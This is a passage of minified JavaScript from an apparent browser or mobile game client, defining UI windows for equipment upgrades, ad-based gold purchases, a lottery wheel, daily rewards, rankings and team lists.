i=a.GlobalConfig.GemUpdateConfig[t].cost||[];return i},e}(s.BaseView);e.EquipInlayUpgradeWin=c,window.EquipInlayUpgradeWin=c,__reflect(c.prototype,"EquipInlayUpgradeWin",[]),window.EquipInlayUpgradeWin=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlayConsumeSkillItem=void 0;var n=i(19),o=i(3),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="ConsumeItemSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data.id;console.log("itemId = ",t),this.imgIcon.source=n.GlobalFun.getItemSource(t),this.lbName.text=gettext("{0}消耗：",n.GlobalFun.getItemName(t));var e=n.GlobalFun.getItemCount(t),i=this.data.count;this.lbProgress.text=e+"/"+i,this.lbProgress.textColor=e>=i?768025:16711680}},e}(o.BaseItemRender);e.EquipInlayConsumeSkillItem=s,window.EquipInlayConsumeSkillItem=s,__reflect(s.prototype,"EquipInlayConsumeSkillItem",[]),window.EquipInlayConsumeSkillItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipSacrificeSuitPanel=void 0;var n=i(5),o=i(1),s=i(22),a=i(0),r=i(38),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="EquipSacrificeSuit",e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!1,this.touchChildren=!0,this.addTouchEvent(this.close,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];for(var i=(t[0],r.EquipCT.ins().sacrificeArr),o=1e3,l=0;l<i.length;l++)i[l].lv<o&&(o=i[l].lv);var h=a.GlobalConfig.EquipSlotAffixConfig[o],u=s.AttributeData.getAttrShowStr(h.attr,":"),p=n.TextFlowMaker.generateTextFlow(u);if(this.curAttr.textFlow=p,h=a.GlobalConfig.EquipSlotAffixConfig[o+1]){var d=s.AttributeData.getAttrShowStr(h.attr,":"),c=n.TextFlowMaker.generateTextFlow(d);this.nextAttr.textFlow=c,this.nextNum.text="Lv"+(o+1)}else this.nextAttr.text="",this.nextNum.text="";o>=a.GlobalConfig.EquipSlotAffixConfig.length?(this.curGroup.visible=!1,this.nextGroup.visible=!1,this.maxGroup.visible=!0,this.curAttr0.textFlow=p):(this.curGroup.visible=!0,this.nextGroup.visible=!0,this.maxGroup.visible=!1),this.SacrificeNum.text="Lv"+o},e.prototype.onClick=function(t){win.close(this)},e}(o.BaseView);e.EquipSacrificeSuitPanel=l,window.EquipSacrificeSuitPanel=l,__reflect(l.prototype,"EquipSacrificeSuitPanel",[]),window.EquipSacrificeSuitPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ExpGoldWin=void 0;var n=i(8),o=i(90),s=i(19),a=i(61),r=i(1),l=i(0),h=i(124),u=i(36),p=i(30),d=i(31),c=i(23),f=i(25),g=i(7),m=i(85),v=i(52),y=i(2),C=function(t){function e(){var e=t.call(this)||this;return e.adCount=0,e._sn_="expGoldSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.grp_ad.visible=platform.getAdType()>0},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.numLab.text="",v.Shop.ins().sendGoldAdCount(),observe(this,this.updateLab,v.Shop.ins().onGoldAdCount),this.addTouchEvent(this.closeBtn,this.onTap),this.addTouchEvent(this.btn0,this.onTap),this.addTouchEvent(this.btn1,this.onTap),this.addTouchEvent(this.btn2,this.onTap),this.thisShow()},e.prototype.removeDisplay=function(){Timer.stop(this.updateCountDown,this)},e.prototype.thisShow=function(){var t=l.GlobalConfig.StoreCommonConfig.buyGold;this.costCm0.setShow(d.ITEM_ICON.gold,"x"+l.GlobalConfig.StoreCommonConfig.buyGoldAdAward),this.costCm1.setShow(d.ITEM_ICON.gold,"x"+t[0][1]),this.costCm11.setShow(d.ITEM_ICON.yuanbao,""+t[0][0]),this.costCm2.setShow(d.ITEM_ICON.gold,"x"+t[1][1]),this.costCm22.setShow(d.ITEM_ICON.yuanbao,""+t[1][0])},e.prototype.updateLab=function(t){if(this.adCount=t,2==platform.getAdType())if(t>0){var e=a.LocationProperty.IOS_NO_AD_TIME-(g.GameServerCC.serverTime-n.DateUtils.formatMiniDateTime(m.Setting.ins().getValue(m.ClientSet.GET_GOLD)));this.btn0.enabled=0>=e,this.updateCountDown(),e>0&&!Timer.has(this.updateCountDown,this)&&Timer.start(1e3,-1,this.updateCountDown,this)}else Timer.stop(this.updateCountDown,this),this.btn0.enabled=!0,this.numLab.text=gettext("还可获取({0}次)",t);else 1==platform.getAdType()?this.numLab.text=gettext("看广告({0}次)",t):3==platform.getAdType()&&(Timer.stop(this.updateCountDown,this),this.numLab.text=gettext("看广告({0}次)",t),this.btn0.enabled=!0)},e.prototype.updateCountDown=function(){var t=a.LocationProperty.IOS_NO_AD_TIME-(g.GameServerCC.serverTime-n.DateUtils.formatMiniDateTime(m.Setting.ins().getValue(m.ClientSet.GET_GOLD)));t>0?this.numLab.text=n.DateUtils.getFormatBySecond(.001*t,n.DateUtils.TIME_FORMAT_3):(this.numLab.text=gettext("还可获取({0}次)",this.adCount),this.btn0.enabled=!0,Timer.stop(this.updateCountDown,this))},e.prototype.onTap=function(t){switch(t.currentTarget){case this.closeBtn:win.close(this);break;case this.btn0:if(this.adCount<=0)return void y.TipsCT.ins().showTips(2==platform.getAdType()?gettext("今日次数已用完"):gettext("今日广告购买次数已用完"));if(2==platform.getAdType())return m.Setting.ins().setValue(m.ClientSet.GET_GOLD,n.DateUtils.formatServerTime(g.GameServerCC.serverTime)),void c.GameLogic.ins().sendAdReward(p.AD_REWARDTYPE.GOLD);if(3==platform.getAdType())return void c.GameLogic.ins().sendAdReward(p.AD_REWARDTYPE.GOLD);if(f.Recharge.ins().isGotAdPrivilege||o.DeviceUtils.IsPC)return void c.GameLogic.ins().sendAdReward(p.AD_REWARDTYPE.GOLD);window.platform.showAd(function(){c.GameLogic.ins().sendAdReward(p.AD_REWARDTYPE.GOLD)},h.AdType.ExpGold);break;case this.btn1:s.GlobalFun.checkCost(l.GlobalConfig.StoreCommonConfig.buyGold[0][0]||0,u.MoneyConst.yuanbao)&&v.Shop.ins().sendBuyGold(1);break;case this.btn2:s.GlobalFun.checkCost(l.GlobalConfig.StoreCommonConfig.buyGold[1][0]||0,u.MoneyConst.yuanbao)&&v.Shop.ins().sendBuyGold(2)}},e}(r.BaseView);e.ExpGoldWin=C,window.ExpGoldWin=C,__reflect(C.prototype,"ExpGoldWin",[]),window.ExpGoldWin=C},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ExpWorldWin=void 0;var n=i(24),o=i(1),s=i(0),a=i(15),r=i(4),l=i(12),h=i(142),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="expWorldSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.closeBtn,this.onClick);var i=this.getDifferenceLevel(),n=this.getExp(i)/1e4*100;this.lv.text=gettext("{0}级",h.OtherCT.ins().worldLevel),this.exp.text=n+"%"},e.prototype.getDifferenceLevel=function(){var t=h.OtherCT.ins().worldLevel-r.ActorCC.level;return t>0?t:0},e.prototype.getExp=function(t){if(!t)return 0;var e=n.CommonUtils.getObjectLength(s.GlobalConfig.ExpWorldConfig);return t=Math.min(t,e),s.GlobalConfig.ExpWorldConfig[t].rate},e.prototype.onClick=function(t){switch(t.currentTarget){case this.closeBtn:win.close(this)}},e.openCheck=function(){return l.OpenSystem.ins().checkSysOpen(a.SystemType.ExpWorld)},e}(o.BaseView);e.ExpWorldWin=u,window.ExpWorldWin=u,__reflect(u.prototype,"ExpWorldWin",[]),window.ExpWorldWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ExtremeBuffTips=void 0;var n=i(1),o=i(21),s=i(0),a=i(5),r=i(126),l=i(31),h=i(4),u=i(65),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="heartmethodSkillTipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.currentState="initial",this.skillShow.visible=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t[0]&&(this.role=t[0]),this.skillMc=new o.MovieClip,this.updateUI()},e.prototype.updateUI=function(){this.skillName.text=s.GlobalConfig.ZhiZunSuitSkillConf.skillName,this.skill.addChild(this.skillMc),this.skillMc.x=250,this.skillMc.y=270,this.skillMc.playFile(RES_DIR_EFF+s.GlobalConfig.ZhiZunSuitSkillConf.skillEff+h.ActorCC.jobId,-1);var t=l.QUALITY_COLOR[1],e=s.GlobalConfig.SkillsConfig[s.GlobalConfig.ZhiZunSuitSkillConf.skillId[h.ActorCC.jobId-1]];this.curskillDesc0.textFlow=a.TextFlowMaker.generateTextFlow(u.SkillUtil.getName(e)||"");var i=0,n=r.ExtremeEquipCC.positions.length;if(this.role)for(var o=0;n>o;o++){var p=0,d=this.role.getEquipByIndex(r.ExtremeEquipCC.positions[o]),c=d.item.configID;c&&(p=d.soulLv),p>0&&i++}else for(var o=0;n>o;o++)r.ExtremeEquipCC.getZhiZunLv(r.ExtremeEquipCC.positions[o])>0&&i++;var f=s.GlobalConfig.ZhiZunSuitSkillConf.kitCount;this.equipName.text=gettext("收集一套霸者装备激活")+("("+i+"/"+f+")"),this.curskillDesc3.textColor=i>=f?t:11645079,this.curskillDesc3.textFlow=a.TextFlowMaker.generateTextFlow(u.SkillUtil.getDesc(e)||"")},e}(n.BaseView);e.ExtremeBuffTips=p,window.ExtremeBuffTips=p,__reflect(p.prototype,"ExtremeBuffTips",[]),window.ExtremeBuffTips=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ExtremeEquipItem=void 0;var n=i(3),o=i(0),s=i(126),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ExtremeEquipItemSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.dataChanged=function(){var t=Number(this.name);this.redPoint.visible=s.ExtremeEquipCC.canOperate(t);var e=s.ExtremeEquipCC.getZhiZunLv(t),i=o.GlobalConfig.ZhiZunEquipLevel[t][e],n=o.GlobalConfig.ZhiZunSuitSkillConf.posName[t],a=n;0>=e?(this.nameLabel.text=a,this.itemIcon.source="xb_"+(10+s.ExtremeEquipCC.positions.indexOf(t)),this.bg.source="quality0"):(this.showEquipEffect(),this.nameLabel.text=i.headTxt+a,this.itemIcon.source="icon_extreme_0"+s.ExtremeEquipCC.positions.indexOf(t),this.bg.source="quality6"),this.selectIcon.visible=this.selected},e.prototype.showEquipEffect=function(){var t=o.GlobalConfig.ItemEffConfig[19][6][0].name;this.EquipEffect.touchEnabled=!1,this.addChildAt(this.EquipEffect,this.getChildIndex(this)),this.EquipEffect.data=RES_DIR_EFF+t},e.prototype.setSelect=function(t){this.selectIcon&&(this.selectIcon.visible=t)},e}(n.BaseItemRender);e.ExtremeEquipItem=a,window.ExtremeEquipItem=a,__reflect(a.prototype,"ExtremeEquipItem",[]),window.ExtremeEquipItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ExtremeEquipTipsWin=void 0;var n=i(0),o=i(16),s=i(1),a=i(48),r=i(126),l=i(5),h=i(40),u=i(10),p=i(22),d=i(13),c=i(31),f=i(4),g=i(65),m=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ExtremeEquipTipsSkin",e.COLOR_OPEN="#43F476",e.COLOR_CLOSE="#75736F",e.itemId=0,e.qlt=0,e.latterTime=50,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(t[0]instanceof h.ItemData)this.itemId=t[0].configID,this.qlt=t[0].quality;else{this.itemId=t[0];var i="number"==typeof this.itemId;this.itemId&&i||(this.itemId=t[0].id),this.qlt=u.ItemUtil.getQuality(n.GlobalConfig.ItemConfig[this.itemId])}var o=n.GlobalConfig.ItemConfig[this.itemId];this.posId=u.ItemUtil.getSubType(o),this.updateTips()},e.prototype.updateTips=function(){var t=this,e=d.SubRoles.ins().getSubRoleByIndex(0),i=r.ExtremeEquipCC.getZhiZunLv(this.posId),s=r.ExtremeEquipCC.getZhiZunLinkLv(e,this.posId,i),h=r.ExtremeEquipCC.getLinkEquipPos(this.posId),m=n.GlobalConfig.ZhiZunLinkLevel[this.posId][h][0==s?1:s];this.pos.text=a.Role.getEquipNameByType(this.posId),this.quali.source="tips_"+this.qlt;var v=n.GlobalConfig.ZhiZunEquipLevel[this.posId][0==i?1:i],y=n.GlobalConfig.ZhiZunEquipLevel[this.posId][1].showPower,C=n.GlobalConfig.ZhiZunSuitSkillConf.posName[this.posId];if(this.equipName.text=C,this.powerPanel.text=gettext("战力：{0}",y),this.value0.textFlow=(new egret.HtmlTextParser).parse(p.AttributeData.getAttrShowStr(r.ExtremeEquipCC.setBasicsDesc(this.posId),":")),v.skillId){var T=n.GlobalConfig.SkillsConfig[v.skillId],b=T.desc,w=n.GlobalConfig.SkillsDescConfig[b],I=g.SkillUtil.getDesc(T);this.skillname0.text=w.name+(i>0?"Lv"+i:gettext("Lv1(未激活)")),this.skilldesc0.textFlow=l.TextFlowMaker.generateTextFlow(I)}else o.DisplayUtils.removeFromParent(this.skillGrp0);var _=a.Role.getEquipNameByType(m.firstSlot)+"",S=a.Role.getEquipNameByType(m.secondSlot)+"",x=r.ExtremeEquipCC.getZhiZunLvByRoleID(e,m.firstSlot)>0?this.COLOR_OPEN:this.COLOR_CLOSE,D=r.ExtremeEquipCC.getZhiZunLvByRoleID(e,m.secondSlot)>0?this.COLOR_OPEN:this.COLOR_CLOSE;
this.itemLab0.textFlow=l.TextFlowMaker.generateTextFlow("<font color="+x+">"+_+"</font><font color="+D+">/"+S+"</font> ");var A=m.name,k=r.ExtremeEquipCC.getZhiZunLv(m.firstSlot),B=r.ExtremeEquipCC.getZhiZunLv(m.secondSlot),P=k>0&&B>0?gettext("(已激活)"):gettext("(未激活)");this.skillname.textFlow=l.TextFlowMaker.generateTextFlow("<font>"+A+P+"</font>"),this.skilldesc.textFlow=l.TextFlowMaker.generateTextFlow(m.chainDesc),this.hasLab0.text="("+((x==this.COLOR_OPEN?1:0)+(D==this.COLOR_OPEN?1:0))+"/2)";for(var R=[],E=r.ExtremeEquipCC.positions,G=0,M=[],L=0;L<E.length;L++){var F=r.ExtremeEquipCC.getZhiZunLvByRoleID(e,E[L]);R.push(F>0?this.COLOR_OPEN:this.COLOR_CLOSE),F>0&&G++;var O=u.ItemUtil.getPosName(L);M.push(O)}var N=getLangType();N==LanguageEnum.EN?this.itemLab.textFlow=l.TextFlowMaker.generateTextFlow("<font color="+R[0]+">"+M[0]+"</font>     <font color="+R[1]+">"+M[1]+"</font>      <font color="+R[2]+">"+M[2]+"</font>\n<font color="+R[3]+">"+M[3]+"</font>     <font color="+R[4]+">"+M[4]+"</font>     <font color="+R[5]+">"+M[5]+"</font>\n<font color="+R[6]+">"+M[6]+"</font>      <font color="+R[7]+">"+M[7]+"</font>      <font color="+R[8]+">"+M[8]+"</font>     <font color="+R[9]+">"+M[9]+"</font>"):this.itemLab.textFlow=l.TextFlowMaker.generateTextFlow("<font color="+R[0]+">"+M[0]+"</font>     <font color="+R[1]+">"+M[1]+"</font>      <font color="+R[2]+">"+M[2]+"</font>      <font color="+R[3]+">"+M[3]+"</font>     <font color="+R[4]+">"+M[4]+"</font>\n<font color="+R[5]+">"+M[5]+"</font>     <font color="+R[6]+">"+M[6]+"</font>      <font color="+R[7]+">"+M[7]+"</font>      <font color="+R[8]+">"+M[8]+"</font>     <font color="+R[9]+">"+M[9]+"</font>"),this.hasLab.text=G+"/10";var W=c.QUALITY_COLOR[1];this.skillname1.textFlow=l.TextFlowMaker.generateTextFlow1("|C:"+W+"&T:【"+n.GlobalConfig.ZhiZunSuitSkillConf.skillName+"】");var U=(n.GlobalConfig.ZhiZunSuitSkillConf.kitCount,n.GlobalConfig.SkillsConfig[n.GlobalConfig.ZhiZunSuitSkillConf.skillId[f.ActorCC.jobId-1]]),H=G>=10?4453494:7697263;this.value2.textFlow=l.TextFlowMaker.generateTextFlow(g.SkillUtil.getDesc(U)),this.value2.textColor=H,setTimeout(function(){t.itemIcon.data=t.itemId,t.latterTime=0},this.latterTime)},e}(s.BaseView);e.ExtremeEquipTipsWin=m,window.ExtremeEquipTipsWin=m,__reflect(m.prototype,"ExtremeEquipTipsWin",[]),window.ExtremeEquipTipsWin=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BabelLotteryWin=void 0;var n=i(1),o=i(54),s=i(92),a=i(2),r=i(11),l=i(23),h=i(0),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="tttZhuanpan",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.choujiangBtn,this.getLottery),observe(this,this.onGetRewards,o.Fb2CT.ins().postLotteryReward),observe(this,this.refreshView,o.Fb2CT.ins().postUpDataInfo),this.updateView()},e.prototype.getLottery=function(){0==s.SkyLevelModel.ins().lotteryRemainTimes?a.TipsCT.ins().showTips(gettext("没有抽奖次数，每通关10层可抽取1次")):this.rolling?a.TipsCT.ins().showTips(gettext("正在抽奖，请稍候")):o.Fb2CT.ins().sendBeginLottery()},e.prototype.onGetRewards=function(){this.beginLottery(s.SkyLevelModel.ins().lotteryAwardIndex)},e.prototype.refreshView=function(){var t=this;s.SkyLevelModel.ins().lotteryUseTimes%10==0?setTimeout(function(){t.updateView()},2e3):this.updateView()},e.prototype.beginLottery=function(t){var e=this,i=1440+36*(t-1),n=egret.Tween.get(this.tttzhi);this.rolling=!0,n.to({rotation:i},4e3,egret.Ease.circOut).call(function(){o.Fb2CT.ins().sendGetReward(),e.flyItem(e["item"+(t-1)]),setTimeout(function(){e.rolling=!1,e.refreshView()},2e3)},this)},e.prototype.flyItem=function(t){var e=new r.ItemBase;e.x=t.x,e.y=t.y,e.data=t.itemIcon.data,e.anchorOffsetX=e.width/2,e.anchorOffsetY=e.height/2,t.parent.addChild(e),l.GameLogic.ins().postFlyItemEx(e)},e.prototype.updateView=function(){this.num.text=s.SkyLevelModel.ins().lotteryRemainTimes.toString();var t=s.SkyLevelModel.ins().lotteryUseTimes,e=10*parseInt((t/10).toString())+10,i=h.GlobalConfig.FbChallengeLotteryConfig[e],n=null==i;n&&(i=h.GlobalConfig.FbChallengeLotteryConfig[e-10]);for(var o=i.groupc.length,a=0;o>a;a++){var r=this["item"+a];r.setItem(i.groupc[a]);var l=n||s.SkyLevelModel.ins().isGetLotteryAward(a+1);r.rewardState(l)}},e}(n.BaseView);e.BabelLotteryWin=u,window.BabelLotteryWin=u,__reflect(u.prototype,"BabelLotteryWin",[]),window.BabelLotteryWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChallengeDayRewardWin=void 0;var n=i(1),o=i(11),s=i(6),a=i(2),r=i(54),l=i(92),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="chuangtianguanDayReward",e.defaultRect=!0,e.layoutNum=LayoutNum.top,e.arr=[],e.items=[],e.maxCount=12,e}return __extends(e,t),e.prototype.addDisplay=function(){this.addTouchEvent(this.GetRewardBtn0,this.challenge),this.addTouchEvent(this.bgClose,this.closeCB),observe(this,this.setBtnStatu,r.Fb2CT.ins().postRewardStatu),r.Fb2CT.ins().sendrequestDayReward()},e.prototype.challenge=function(){for(var t=[],e=0,i=0;i<this.arr.length;i++){var n=this.arr[i][1];t[n]||(e++,t[n]=n)}if(e&&s.BagCT.ins().getAllSurplusCount(e)<0)return a.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")),void win.close(this);var o=function(){r.Fb2CT.ins().sendGetDayReward()};this.playGet(o),this.canClicck=!1},e.prototype.setBtnStatu=function(){l.SkyLevelModel.ins().rewardTimes>=1?this.GetRewardBtn0.label=gettext("继续领取({0})",l.SkyLevelModel.ins().rewardTimes):this.GetRewardBtn0.label=gettext("确定"),this.arr=l.SkyLevelModel.ins().dayRewardList.slice(),this.playResult()},e.prototype.playResult=function(t){for(var e=this,i=this.arr.length>this.maxCount?this.maxCount:this.arr.length,n=0;i>n;n++){this.items[n]=this.createItem(this.arr[n]);var o=egret.Tween.get(this.items[n]);this.items[n].x=n%4*77,this.items[n].y=93*Math.floor(n/4),this.items[n].alpha=0,o.wait(50*n).to({alpha:1},200).call(function(){i--,0==i&&(void 0!=t&&t(),e.canClicck=!0)})}},e.prototype.playGet=function(t){for(var e=this,i=this.arr.length>this.maxCount?this.maxCount:this.arr.length,n=0;i>n;n++)if(this.items[n]){var o=egret.Tween.get(this.items[n]);o.to({y:320,x:620,scaleX:0,scaleY:0},300-50*Math.floor(n/4)).call(function(){i--,0==i&&(void 0!=t&&t(),e.releaseAllItem())})}},e.prototype.createItem=function(t){var e=new o.ItemBase;return this.listCon.addChild(e),e.data={type:t[0],count:t[2],id:t[1]},e.x=180,e.y=500,e},e.prototype.releaseAllItem=function(){for(var t in this.items)this.items[t].destruct(),this.listCon.removeChild(this.items[t]);this.items=[],0==l.SkyLevelModel.ins().rewardTimes&&win.close("ChallengeDayRewardWin")},e.prototype.closeCB=function(t){var e=this;if(this.canClicck){this.canClicck=!1;var i=function(){win.close(e)};this.playGet(i)}},e}(n.BaseView);e.ChallengeDayRewardWin=h,window.ChallengeDayRewardWin=h,__reflect(h.prototype,"ChallengeDayRewardWin",[]),window.ChallengeDayRewardWin=h},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DemonSceneWin=void 0;var n=i(1),o=i(0),s=i(115),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="DemonSceneSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=o.GlobalConfig.DemonCirFbConf,n=i[s.DemonCir.ins().curLayerId];this.nameTxt.text=""+n.fbName},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e}(n.BaseView);e.DemonSceneWin=a,window.DemonSceneWin=a,__reflect(a.prototype,"DemonSceneWin",[]),window.DemonSceneWin=a},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SkyItemRenderer=void 0;var n=i(92),o=i(3),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="chuangtianguanItem",e.touchEnabled=!1,e}return __extends(e,t),e.prototype.addDisplay=function(){this.cfg&&this.skin&&(this.passAllTip0.text=this.cfg.layer+"层",this.currentState=this.cfg.id==n.SkyLevelModel.ins().cruLevel?"down":"up")},e.prototype.dataChanged=function(){this.cfg=this.data,this.addDisplay()},e}(o.BaseItemRender);e.SkyItemRenderer=s,window.SkyItemRenderer=s,__reflect(s.prototype,"SkyItemRenderer",[]),window.SkyItemRenderer=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FBChallengeRankWin=void 0;var n=i(1),o=i(884),s=i(0),a=i(92),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ChuangtianguanRankSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.rankModel=t[0],this.list0.itemRenderer=o.FBChallengeRankItem,this.init()},e.prototype.init=function(){var t=this.rankModel.getDataList(),e=[];for(var i in t){if(!t[i].count)break;e.push(t[i])}this.list0.dataProvider=new eui.ArrayCollection(e);var n,o=e[this.rankModel.selfPos-1];if(o)n=s.GlobalConfig.FbChallengeConfig[o.count],this.myRank.text=gettext("我的排名：")+this.rankModel.selfPos;else{var r=a.SkyLevelModel.ins();n=s.GlobalConfig.FbChallengeConfig[r.cruLevel],this.myRank.text=gettext("我的排名：未上榜")}n&&(this.myNum.text=gettext("{0}重天{1}层",n.group,n.layer))},e}(n.BaseView);e.FBChallengeRankWin=r,window.FBChallengeRankWin=r,__reflect(r.prototype,"FBChallengeRankWin",[]),window.FBChallengeRankWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FBChallengeRankItem=void 0;var n=i(3),o=i(0),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ChuangtianguanRankItem",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data&&(this.data.pos>3?(this.rankImg.visible=!1,this.rank.visible=!this.rankImg.visible,this.rank.text=this.data.pos+""):(this.rankImg.visible=!0,this.rank.visible=!this.rankImg.visible,this.rankImg.source="paihang"+this.data.pos),this.vip.visible=this.data.vip,this.nameLabel.text=this.data.player,this.data.count)){var t=o.GlobalConfig.FbChallengeConfig[this.data.count];this.cengNum.text=gettext("{0}重天{1}层",t.group,t.layer)}},e}(n.BaseItemRender);e.FBChallengeRankItem=s,window.FBChallengeRankItem=s,__reflect(s.prototype,"FBChallengeRankItem",[]),window.FBChallengeRankItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FBCountDown=void 0;var n=i(1),o=i(20),s=function(t){function e(){var e=t.call(this)||this;return e._count=1,e._sn_="FBCountDownSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];switch(o.GameMap.fbType){default:return}Timer.stop(this.upFun,this),Timer.start(1e3,this._count+1,this.upFun,this),this.upFun()},e.prototype.upFun=function(){this.countDown.text=this._count+"",this._count--,this._count<0&&win.close("FBCountDown")},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];switch(o.GameMap.fbType){default:return!1}return!0},e}(n.BaseView);e.FBCountDown=s,window.FBCountDown=s,__reflect(s.prototype,"FBCountDown",[]),window.FBCountDown=s},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ResBloodWin=void 0;var n=i(1),o=i(0),s=i(13),a=i(34),r=i(2),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="resbloodskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onTap);var t=o.GlobalConfig.CityRecoverConfig;for(var e in t)this["eCost"+e].text=t[e].cost.count+"",this["eBtn"+e].name=t[e].idx},e.prototype.onTap=function(t){if(t.target instanceof eui.Button&&t.target.name){var e=s.SubRoles.ins().roles[0];e.getAtt(a.AttributeType.atHp)<e.getAtt(a.AttributeType.atMaxHp)?(send(Ts.restoreBlood,{idx:+t.target.name}),r.TipsCT.ins().showTips(gettext("身体已恢复健康")),win.close(this)):r.TipsCT.ins().showTips(gettext("身体健康，无需恢复"))}},e}(n.BaseView);e.ResBloodWin=l,window.ResBloodWin=l,__reflect(l.prototype,"ResBloodWin",[]),window.ResBloodWin=l},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamCityListWin=void 0;var n=i(1),o=i(0),s=i(4),a=i(43),r=i(27),l=i(384),h=i(385),u=i(386),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamCityListSkin",e.isHasTemp=!1,e.tabIdx=0,e.applyTeamList=[],e}return __extends(e,t),e.prototype.skinComplete=function(){a.CityCC.ins().sendTeamList(),a.CityCC.ins().sendTeamPlayerInfo(),this.list1.itemRenderer=l.TeamCityItem1,this.list2.itemRenderer=h.TeamCityItem2,this.list3.itemRenderer=u.TeamCityItem3},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateView,a.CityCC.ins().doPostTeamList),observe(this,this.updateList1,a.CityCC.ins().doPostTeamList),observe(this,this.updateData,a.CityCC.ins().doPostTeamPlayerInfo),observe(this,this.updateList2,a.CityCC.ins().doPostTeamItemInfo),observe(this,this.updateList3,a.CityCC.ins().postChangeApplyList),observe(this,this.updateRp,a.CityCC.ins().postChangeApplyList,a.CityCC.ins().doPostTeamPlayerInfo),this.list1.dataProvider=this.list2.dataProvider=this.list3.dataProvider=this.eTab.dataProvider=new eui.ArrayCollection([]),this.applyTeamList=[],this.addTouchEvent(this.cb0,this.onClick),this.addTouchEvent(this.exitBtn1,this.onClick),this.addTouchEvent(this.exitBtn2,this.onClick),this.addTouchEvent(this.goBtn,this.onClick),this.addTouchEvent(this.exitBtn,this.onClick),this.addTouchEvent(this.btnHelp,this.onClick),this.eTab.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.updateTab(),this.updateView(),this.updateList3()},e.prototype.updateRp=function(){if(this.eTab.validateNow(),this.eTab.numChildren>=3){var t=this.eTab.getElementAt(2);t&&t.eRp&&(t.eRp.visible=!!a.CityCC.ins().teamApplyList.length)}},e.prototype.updateList1=function(){for(var t=a.CityCC.ins().teamList,e=0;e<t.length;e++)t[e].applylist=this.applyTeamList;this.list1.dataProvider=new eui.ArrayCollection(a.CityCC.ins().teamList)},e.prototype.updateList2=function(t){this.updateView(),this.list2.dataProvider=new eui.ArrayCollection(t)},e.prototype.updateList3=function(){this.list3.dataProvider=new 